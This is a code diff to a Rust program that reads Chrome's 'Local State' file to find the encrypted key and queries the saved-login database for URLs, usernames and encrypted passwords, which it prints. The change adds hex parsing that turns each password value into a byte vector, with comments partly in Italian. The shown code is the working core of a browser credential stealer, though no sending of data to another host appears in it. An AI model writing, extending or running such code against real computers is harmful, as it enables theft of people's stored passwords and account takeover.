@@ -9,6 +9,9 @@ use regex::Regex;                           // used to find the encrypted_key in
 use rusqlite::{params, Connection, Result}; // used to extract encrypted password, username, URL
 use rusqlite::types::Value;
 
+extern crate hex;
+use hex::FromHex;
+
 fn get_chrome_local_pass_path() -> PathBuf{
     let userprofile = env::var("USERPROFILE").unwrap_or_else(|_| String::from("."));                                        // Get the USERPROFILE environment variable
     let local_pass_path = PathBuf::from(format!(r"{}\AppData\Local\Google\Chrome\User Data\Local State", userprofile));     // Construct the path
@@ -100,8 +103,22 @@ fn main() -> Result<(), Box<dyn Error>> {
         if action_url != ""{
             println!("Action URL: {}", action_url);
             println!("Username Value: {}", username_value);
-            // Stampa la stringa formattata
             println!("Password Value: {}", convert_value_to_hex(password_value.clone()));
+            let password_string = convert_value_to_hex(password_value.clone());
+            
+            // Rimuovi il prefisso \\x e dividilo in sottostringhe
+            let hex_values: Vec<&str> = password_string[2..].split("\\x").collect();
+
+            // Converti le sottostringhe esadecimali in vettori di byte
+            let bytes: Vec<u8> = hex_values.iter().filter_map(|s| {
+                match <[u8; 1]>::from_hex(s) {
+                    Ok(v) => Some(v[0]),
+                    Err(_) => None,
+                }
+            }).collect();
+
+            // Stampa il vettore di byte come byte literal
+            println!("{:?}", bytes);
             println!("-----------------------");
         }
         
